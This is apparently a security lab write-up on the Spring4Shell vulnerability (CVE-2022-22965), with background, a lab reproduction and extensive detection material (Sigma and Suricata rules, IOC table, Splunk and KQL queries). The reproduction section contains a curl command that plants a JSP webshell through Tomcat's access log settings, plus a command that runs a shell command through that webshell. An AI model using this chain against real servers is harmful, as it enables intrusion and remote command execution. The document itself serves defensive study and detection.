# CVE-2022-22965 — Spring4Shell (Spring Framework RCE via Data Binding)

## 1. CVE Background & Impact

| Field | Value |
|-------|-------|
| CVE ID | CVE-2022-22965 |
| CVSS | 9.8 (Critical) |
| Affected | Spring Framework 5.3.0–5.3.17, 5.2.0–5.2.19 (on JDK 9+, Tomcat WAR deployment) |
| Type | Remote Code Execution via ClassLoader manipulation |
| CISA KEV | Yes (2022-04-04) |
| MITRE ATT&CK | T1190 (Exploit Public-Facing Application), T1505.003 (Web Shell) |

Spring Framework's data binding mechanism on JDK 9+ exposes the `class.module.classLoader` property chain. An attacker can traverse this chain to reach Tomcat's `AccessLogValve` and modify its configuration to write arbitrary content (JSP webshell) to the web root.

Conditions: Spring MVC/WebFlux app deployed as WAR on Tomcat, running JDK 9+.

## 2. Reproduction Steps

**Environment**: Spring WebMVC 5.3.17, Tomcat 9, JDK 11 — via vulhub `spring/CVE-2022-22965`.

**Attack Chain**:

```
┌──────────┐  GET /?class.module.classLoader...  ┌──────────────┐
│ Attacker │ ──────────────────────────────────► │ Spring+Tomcat│
└──────────┘                                     │   (8080)     │
                                                 └──────┬───────┘
  1. Modify AccessLogValve:                             │
     - pattern = JSP webshell code                      │
     - suffix = .jsp                                    │
     - directory = webapps/ROOT                         │
     - prefix = tomcatwar                               │
                                                        ▼
  2. Next request triggers log write ──► tomcatwar.jsp created
  3. GET /tomcatwar.jsp?pwd=j&cmd=id ──► RCE as root
```

**Steps**:
1. Start target: `docker compose up -d` (Spring app on :8080)
2. Write webshell via property binding:
```bash
curl --noproxy '*' -g -H "suffix: %>//" -H "c1: Runtime" -H "c2: <%" -H "DNT: 1" \
  'http://target:8080/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=...(URL-encoded JSP)...&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='
```
3. Trigger webshell: `curl 'http://target:8080/tomcatwar.jsp?pwd=j&cmd=id'`
4. Result: `uid=0(root) gid=0(root) groups=0(root)`
5. Cleanup: Reset pattern to empty to stop log pollution.

## 3. Defense

### 3.1 Hardening / Patches / Mitigations

1. **Upgrade Spring Framework** to 5.3.18+ or 5.2.20+
2. **Upgrade Tomcat** to 10.0.20+, 9.0.62+, or 8.5.78+ (added `getModule()` return null)
3. **Upgrade JDK** to 8 (not affected) or apply JDK-level mitigations
4. **WAF rule**: Block requests containing `class.module.classLoader` in any parameter
5. **Disallow binding to sensitive properties** via `@InitBinder` with `setDisallowedFields("class.*", "*.class.*")`
6. **Deploy as JAR** instead of WAR (eliminates the Tomcat AccessLogValve vector)
7. **File integrity monitoring**: Alert on new `.jsp` files appearing in webapps directories
8. **Restrict write permissions**: Run Tomcat with read-only webapps directory where possible
9. **Network segmentation**: Limit outbound connections from web servers

### 3.2 Detection (Narrative)

**WAF / ModSecurity**:
Block HTTP requests where any parameter name contains `class.module.classLoader`. This string has no legitimate use in normal application parameters. Also match URL-encoded variants (`class%2Emodule%2EclassLoader`).

**File Integrity Monitoring (OSSEC/Wazuh/Auditd)**:
Monitor Tomcat webapps directories for new `.jsp` file creation. In production, JSP files should only appear during deployments, never from runtime activity.

**Application Logs**:
Spring Framework logs property binding errors at DEBUG level. Unusual binding attempts to `class.module.*` properties indicate exploitation attempts even if they fail.

### 3.3 Threat Hunting (Narrative)

**Web Access Logs**:
- Search for `class.module.classLoader` or `class%2Emodule` in URI query strings
- Look for requests setting multiple `pipeline.first.*` parameters in a single request
- Check for sequential pattern: first a request with `classLoader` params, then access to a new `.jsp`

**File System**:
- New `.jsp` files in webapps/ROOT that weren't part of the deployment
- Files named `tomcatwar.jsp`, `shell.jsp`, `cmd.jsp` (common exploit defaults)
- AccessLogValve config changes in Tomcat's server.xml or runtime state

**Process/Network**:
- Tomcat/Java process spawning shells after a suspicious HTTP request
- Outbound connections from Tomcat to unusual IPs post-exploitation

### 3.4 SOC Artifacts

#### 3.4.1 Sigma Rule — HTTP Request Detection

```yaml
title: Spring4Shell Exploitation Attempt via ClassLoader Manipulation
id: c3d5e7f9-2b4a-6c8e-0d1f-4a6b8c0e2d4f
status: stable
level: critical
description: >
  Detects CVE-2022-22965 (Spring4Shell) exploitation attempts by matching
  class.module.classLoader property binding patterns in HTTP request parameters.
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2022-22965
  - https://tanzu.vmware.com/security/cve-2022-22965
author: Security Lab
date: 2026/05/21
tags:
  - attack.initial_access
  - attack.t1190
  - attack.persistence
  - attack.t1505.003
  - cve.2022.22965
logsource:
  category: webserver
detection:
  selection:
    cs-uri-query|contains:
      - 'class.module.classLoader'
      - 'class%2Emodule%2EclassLoader'
      - 'class%2emodule%2eclassLoader'
  condition: selection
falsepositives:
  - Security scanners testing for Spring4Shell
level: critical
```

#### 3.4.2 Sigma Rule — Post-Exploitation (New JSP File)

```yaml
title: Spring4Shell Post-Exploitation - Suspicious JSP File Created
id: d4e6f8a0-3c5b-7d9f-1e2a-5b7c9d1f3e5a
status: stable
level: high
description: >
  Detects new JSP files created in Tomcat webapps directories at runtime,
  indicating potential webshell deployment via Spring4Shell or similar.
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2022-22965
author: Security Lab
date: 2026/05/21
tags:
  - attack.persistence
  - attack.t1505.003
  - cve.2022.22965
logsource:
  category: file_event
  product: linux
detection:
  selection:
    TargetFilename|contains: '/webapps/'
    TargetFilename|endswith: '.jsp'
  filter_deploy:
    Image|endswith:
      - '/deploy.sh'
      - '/maven'
      - '/gradle'
  condition: selection and not filter_deploy
falsepositives:
  - Legitimate application deployments
```

#### 3.4.3 Suricata Rules

```
# Spring4Shell ClassLoader Manipulation in HTTP Request
alert http $EXTERNAL_NET any -> $HOME_NET any (
  msg:"ET EXPLOIT Spring4Shell ClassLoader Manipulation (CVE-2022-22965)";
  flow:established,to_server;
  content:"class.module.classLoader"; nocase; http_uri;
  reference:cve,2022-22965;
  classtype:attempted-admin;
  sid:2022022965;
  rev:1;
  metadata:attack_target Server, deployment Perimeter, tag CVE-2022-22965;
)

# Spring4Shell AccessLogValve Manipulation
alert http $EXTERNAL_NET any -> $HOME_NET any (
  msg:"ET EXPLOIT Spring4Shell AccessLogValve Write (CVE-2022-22965)";
  flow:established,to_server;
  content:"pipeline.first.pattern"; nocase; http_uri;
  content:"classLoader"; nocase; http_uri;
  reference:cve,2022-22965;
  classtype:attempted-admin;
  sid:2022022966;
  rev:1;
  metadata:attack_target Server, deployment Perimeter, tag CVE-2022-22965;
)

# Spring4Shell URL-Encoded Variant
alert http $EXTERNAL_NET any -> $HOME_NET any (
  msg:"ET EXPLOIT Spring4Shell URL-Encoded ClassLoader (CVE-2022-22965)";
  flow:established,to_server;
  content:"class%2Emodule%2EclassLoader"; nocase; http_uri;
  reference:cve,2022-22965;
  classtype:attempted-admin;
  sid:2022022967;
  rev:1;
  metadata:attack_target Server, deployment Perimeter, tag CVE-2022-22965;
)
```

#### 3.4.4 Structured IOC Table

| Type | Indicator | Confidence | Notes |
|------|-----------|------------|-------|
| Pattern (URI) | `class.module.classLoader` | Critical | Core exploitation string |
| Pattern (URI) | `pipeline.first.pattern` | High | AccessLogValve manipulation |
| Pattern (URI) | `pipeline.first.suffix=.jsp` | High | Webshell file extension setting |
| Pattern (Encoded) | `class%2Emodule%2EclassLoader` | High | URL-encoded variant |
| File | New `.jsp` in webapps/ROOT at runtime | Critical | Webshell indicator |
| File | `tomcatwar.jsp` | High | Default exploit filename |
| File | AccessLogValve config change | High | Exploitation side-effect |
| Process | java/tomcat → bash/sh/cmd | Critical | Post-exploitation via webshell |
| Header | `suffix: %>//` | High | Exploit-specific custom header |
| Header | `c1: Runtime` | High | Exploit-specific custom header |
| Header | `c2: <%` | High | Exploit-specific custom header |
| Library | Spring Framework 5.3.0–5.3.17 | Critical | Vulnerable (JDK 9+) |
| Library | Spring Framework 5.2.0–5.2.19 | Critical | Vulnerable (JDK 9+) |

#### 3.4.5 SIEM Hunting Queries

**Splunk SPL — Detect Spring4Shell Exploitation Attempt**:

```spl
index=web sourcetype=access_combined OR sourcetype=apache:access
| where match(uri_query, "(?i)class\.module\.classLoader")
| stats count values(uri_query) as payloads by src_ip, dest, status
| where count > 0
| table src_ip dest status count payloads
```

**Splunk SPL — New JSP File Created in Webapps**:

```spl
index=sysmon OR index=linux sourcetype=sysmon OR sourcetype=linux:audit
  EventType=FileCreate
| where match(TargetFilename, "(?i)webapps.*\.jsp$")
| stats count by host, TargetFilename, Image, _time
| sort -_time
```

**Microsoft Sentinel KQL — Spring4Shell HTTP Detection**:

```kql
W3CIISLog
| where csUriQuery has "class.module.classLoader"
    or csUriQuery has "class%2Emodule%2EclassLoader"
| extend ExploitParams = extract_all(@"(pipeline\.first\.\w+)=([^&]*)", csUriQuery)
| project TimeGenerated, cIP, csUriStem, csUriQuery, scStatus
| sort by TimeGenerated desc
```

**Microsoft Sentinel KQL — Webshell File Creation Post-Exploit**:

```kql
DeviceFileEvents
| where FileName endswith ".jsp"
    and FolderPath has "webapps"
    and ActionType == "FileCreated"
| join kind=inner (
    DeviceProcessEvents
    | where InitiatingProcessFileName in~ ("java", "tomcat")
) on DeviceId
| project Timestamp, DeviceName, FolderPath, FileName, 
    InitiatingProcessCommandLine
| sort by Timestamp desc
```

## 4. References

- [NVD CVE-2022-22965](https://nvd.nist.gov/vuln/detail/CVE-2022-22965)
- [VMware Tanzu Advisory](https://tanzu.vmware.com/security/cve-2022-22965)
- [CISA Alert](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-174a)
- [Microsoft Spring4Shell Guidance](https://www.microsoft.com/en-us/security/blog/2022/04/04/springshell-rce-vulnerability-guidance-for-protecting-against-and-detecting-cve-2022-22965/)
- [Praetorian Deep Dive](https://www.praetorian.com/blog/spring-core-jdk9-rce/)
